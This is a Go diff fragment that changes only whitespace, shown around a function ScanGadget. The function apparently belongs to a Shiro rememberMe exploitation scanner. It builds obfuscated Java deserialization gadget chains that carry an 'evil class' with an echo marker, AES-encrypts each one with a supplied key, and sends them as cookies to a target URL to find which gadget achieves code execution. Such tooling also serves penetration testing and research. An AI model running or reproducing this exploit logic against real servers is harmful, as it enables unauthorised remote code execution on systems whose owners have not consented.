@@ -43,12 +43,12 @@ func ScanGadget(u, cookieName, key string, mode string) string {
         logging.Logger.Errorln(err)
         return ""
     }
-
+    
     echoKey := util.RandomString(6)
     echoValue := util.RandomString(8)
     reqValue := echoKey + "|" + echoValue
     payloadObj, _ := yso.LoadClassFromBytes(bytesCode)
-
+    
     flag := payloadObj.FindConstStringFromPool("Etag|3147526947")
     if flag != nil {
         flag.Value = reqValue
@@ -63,12 +63,12 @@ func ScanGadget(u, cookieName, key string, mode string) string {
         logging.Logger.Errorf("DecodeBase64 %v", err)
         return ""
     }
-
+    
     var gadgetName = ""
     for gadget, genGadget := range gadgets {
         logging.Logger.Debugf("check gadget %v", gadget)
         className := util.RandomString(8)
-
+        
         gadgetObj, err := genGadget(yso.SetBytesEvilClass(fixPayload), yso.SetObfuscation(), yso.SetClassName(className))
         if err != nil {
             logging.Logger.Errorln(err)
@@ -81,7 +81,7 @@ func ScanGadget(u, cookieName, key string, mode string) string {
         }
         payload := ""
         payloadPadding := codec.PKCS5Padding(gadgetBytes, 16)
-
+        
         if mode == "GCM" {
             encodePayload, err := codec.AESGCMEncrypt(keyDecoded, payloadPadding, nil)
             if err != nil {
@@ -102,7 +102,7 @@ func ScanGadget(u, cookieName, key string, mode string) string {
             }
             payload = codec.EncodeBase64(append(iv, encodePayload...))
         }
-
+        
         var header = make(map[string]string, 1)
         header["Cookie"] = cookieName + "=" + payload
         if res, err := httpx.Request(u, "GET", "", header); err == nil {
